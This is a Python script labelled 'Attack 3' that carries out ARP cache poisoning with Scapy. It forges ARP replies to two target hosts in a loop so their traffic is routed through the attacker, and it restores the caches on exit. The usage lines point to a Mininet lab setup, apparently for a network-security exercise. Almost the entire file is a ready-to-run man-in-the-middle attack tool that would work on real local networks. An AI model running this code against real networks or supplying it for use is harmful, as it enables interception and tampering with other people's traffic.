#!/usr/bin/env python3
"""
Attack 3: ARP Cache Poisoning (Man-in-the-Middle)
Forges ARP reply packets to poison the ARP caches of two targets,
redirecting their traffic through the attacker (MITM position).

Uses Scapy for packet crafting -- no external attack tools.

Usage (from mininet CLI):
    ws2 python3 attacks/attack_3.py --target1 10.1.0.3 --target2 10.1.0.1
    ws2 python3 attacks/attack_3.py --target1 10.1.0.3 --target2 10.1.0.1 --duration 60 --verbose
"""

import argparse
import ipaddress
import signal
import sys
import time

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, sendp, conf

# Suppress scapy runtime warnings
conf.verb = 0


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def get_attacker_mac(iface=None):
    """Return the MAC address of the attacker's interface."""
    iface = iface or conf.iface
    return get_if_hwaddr(iface)


def get_target_mac(target_ip, iface=None):
    """
    Resolve an IP address to its MAC via ARP.
    Returns the MAC string, or None if the host does not respond.
    """
    mac = getmacbyip(target_ip)
    if mac is None or mac == "ff:ff:ff:ff:ff:ff":
        return None
    return mac


# ---------------------------------------------------------------------------
# Packet construction
# ---------------------------------------------------------------------------

def create_arp_poison(victim_ip, victim_mac, spoofed_ip, attacker_mac):
    """
    Build a forged ARP reply that tells victim:
      "<spoofed_ip> is at <attacker_mac>"
    """
    return Ether(dst=victim_mac) / ARP(
        op=2,                   # ARP reply
        pdst=victim_ip,
        hwdst=victim_mac,
        psrc=spoofed_ip,
        hwsrc=attacker_mac,
    )


def create_arp_restore(victim_ip, victim_mac, real_ip, real_mac):
    """
    Build a genuine ARP reply that restores the correct mapping:
      "<real_ip> is at <real_mac>"
    """
    return Ether(dst=victim_mac) / ARP(
        op=2,
        pdst=victim_ip,
        hwdst=victim_mac,
        psrc=real_ip,
        hwsrc=real_mac,
    )


# ---------------------------------------------------------------------------
# Attack loop
# ---------------------------------------------------------------------------

def send_arp_packets(t1_ip, t1_mac, t2_ip, t2_mac, attacker_mac,
                     iface, interval, duration, verbose):
    """
    Continuously send forged ARP replies to both targets until duration
    expires (0 = run until Ctrl+C) or a signal is received.
    """
    pkt_to_t2 = create_arp_poison(t2_ip, t2_mac, t1_ip, attacker_mac)
    pkt_to_t1 = create_arp_poison(t1_ip, t1_mac, t2_ip, attacker_mac)

    start = time.time()
    sent  = 0

    while True:
        sendp(pkt_to_t2, iface=iface, verbose=False)
        sendp(pkt_to_t1, iface=iface, verbose=False)
        sent += 2

        if verbose:
            print(f"  [+] Sent pair #{sent//2}: "
                  f"{t1_ip}->{t2_ip} and {t2_ip}->{t1_ip}", flush=True)
        else:
            print(f"\r  [+] ARP packets sent: {sent}", end="", flush=True)

        if duration > 0 and (time.time() - start) >= duration:
            break

        time.sleep(interval)

    if not verbose:
        print()


def restore_arp(t1_ip, t1_mac, t2_ip, t2_mac, iface, count=5):
    """
    Send the real ARP mappings to both targets to undo the poisoning.
    Repeated 'count' times to ensure delivery.
    """
    pkt_to_t2 = create_arp_restore(t2_ip, t2_mac, t1_ip, t1_mac)
    pkt_to_t1 = create_arp_restore(t1_ip, t1_mac, t2_ip, t2_mac)

    for _ in range(count):
        sendp(pkt_to_t2, iface=iface, verbose=False)
        sendp(pkt_to_t1, iface=iface, verbose=False)
        time.sleep(0.2)


# ---------------------------------------------------------------------------
# Signal handling
# ---------------------------------------------------------------------------

# Globals used by the signal handler
_restore_args = None


def handle_sigint(sig, frame):
    print("\n[!] Ctrl+C detected")
    if _restore_args:
        print("[*] Restoring ARP caches...")
        restore_arp(*_restore_args)
        print("[+] ARP caches restored")
    print("[+] Attack stopped")
    sys.exit(0)


# ---------------------------------------------------------------------------
# Argument parsing and validation
# ---------------------------------------------------------------------------

def parse_args():
    parser = argparse.ArgumentParser(
        description="ARP Cache Poisoning (MITM) -- Scapy, no external tools"
    )
    parser.add_argument("--target1",   required=True, help="IP to impersonate")
    parser.add_argument("--target2",   required=True, help="IP of the victim to deceive")
    parser.add_argument("--iface",     default=None,  help="Network interface (auto-detect if omitted)")
    parser.add_argument("--duration",  type=float, default=0,   help="Duration in seconds (0 = infinite)")
    parser.add_argument("--interval",  type=float, default=2.0, help="Seconds between ARP bursts (default 2.0)")
    parser.add_argument("--verbose",   action="store_true",     help="Detailed per-packet output")
    return parser.parse_args()


def validate_args(args):
    errors = []

    for name, val in [("--target1", args.target1), ("--target2", args.target2)]:
        try:
            ipaddress.ip_address(val)
        except ValueError:
            errors.append(f"{name}: '{val}' is not a valid IP address")

    if args.target1 == args.target2:
        errors.append("--target1 and --target2 must be different")

    if args.duration < 0:
        errors.append("--duration must be >= 0")

    if args.interval <= 0:
        errors.append("--interval must be > 0")

    if errors:
        for e in errors:
            print(f"[-] {e}")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global _restore_args

    args = parse_args()
    validate_args(args)

    signal.signal(signal.SIGINT, handle_sigint)

    iface        = args.iface or conf.iface
    attacker_mac = get_attacker_mac(iface)

    print("[*] ARP Cache Poisoning Attack")
    print(f"[*] Interface   : {iface}")
    print(f"[*] Attacker MAC: {attacker_mac}")
    print(f"[*] Target 1    : {args.target1}")
    print(f"[*] Target 2    : {args.target2}")

    print(f"[*] Resolving MACs...")
    t1_mac = get_target_mac(args.target1, iface)
    t2_mac = get_target_mac(args.target2, iface)

    if t1_mac is None:
        print(f"[-] Could not resolve MAC for {args.target1} -- is the host up?")
        sys.exit(1)
    if t2_mac is None:
        print(f"[-] Could not resolve MAC for {args.target2} -- is the host up?")
        sys.exit(1)

    print(f"[+] {args.target1} -> {t1_mac}")
    print(f"[+] {args.target2} -> {t2_mac}")

    # Register restore parameters for the signal handler
    _restore_args = (args.target1, t1_mac, args.target2, t2_mac, iface)

    duration_str = f"{args.duration}s" if args.duration > 0 else "infinite (Ctrl+C to stop)"
    print(f"[*] Duration    : {duration_str}")
    print(f"[*] Interval    : {args.interval}s")
    print("[*] Starting attack...\n")

    try:
        send_arp_packets(
            args.target1, t1_mac,
            args.target2, t2_mac,
            attacker_mac,
            iface, args.interval, args.duration, args.verbose,
        )
    except Exception as e:
        print(f"\n[-] Unexpected error: {e}")
    finally:
        print("[*] Restoring ARP caches...")
        restore_arp(args.target1, t1_mac, args.target2, t2_mac, iface)
        print("[+] ARP caches restored")
        print("[+] Attack stopped")


if __name__ == "__main__":
    main()
